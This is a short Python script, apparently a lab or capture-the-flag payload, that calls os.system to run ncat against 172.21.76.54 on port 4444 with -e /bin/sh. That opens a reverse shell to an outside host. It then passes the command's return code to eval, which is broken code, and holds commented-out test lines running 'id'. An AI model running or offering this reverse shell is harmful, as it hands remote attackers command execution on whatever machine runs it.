import os
rce = os.system("ncat 172.21.76.54 4444 -e /bin/sh")
print(eval(rce))
# print(os.system("id"))
# print(eval("__main__.fail"))